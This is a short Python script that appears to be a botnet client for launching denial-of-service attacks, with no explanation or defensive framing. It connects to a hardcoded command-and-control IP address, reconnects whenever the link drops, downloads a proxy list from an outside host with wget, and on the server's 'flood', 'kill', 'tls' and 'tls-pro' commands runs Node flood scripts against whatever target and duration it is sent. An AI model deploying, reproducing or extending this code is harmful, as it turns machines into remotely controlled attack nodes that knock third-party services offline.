import socket
import time
import os
import subprocess
SERVER_IP = "160.191.243.93"
PORT = 9000

while True:
    try:
        s = socket.socket()
        s.connect((SERVER_IP, PORT))

        while True:
            data = s.recv(4096)
            if not data:
                raise Exception
            cmd = data.decode(errors="ignore").split()
            
            if cmd[0] == "update":
                s.sendall(b"updating...")
                s.close()
                exit(0)
            if cmd[0] == "load":
                subprocess.Popen(
                    ["wget", "https://popsiclenetwork.github.io/proxy/proxies.txt"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
            if cmd[0] == "flood" :
                subprocess.Popen(
                    ["node", f"./script/flood.js" , cmd[1], cmd[2], "100", "300" , "proxies.txt"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    shell=True
                )
            if cmd[0] == "kill" :
                subprocess.Popen(
                    ["node", f"./script/flood.js" , cmd[1], cmd[2], "300" , "proxies.txt", "100"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    shell=True
                )
            if cmd[0] == "tls-pro" :
                subprocess.Popen(
                    ["node", f"./script/tls-pro.js" ,cmd[1],"proxies.txt",cmd[2]],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    shell=True
                )
            if cmd[0] == "tls" :
                subprocess.Popen(
                    ["node", f"./script/flood.js" , cmd[1], cmd[2],"300" , "proxies.txt","100"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    shell=True
                )


    except:
        time.sleep(5)
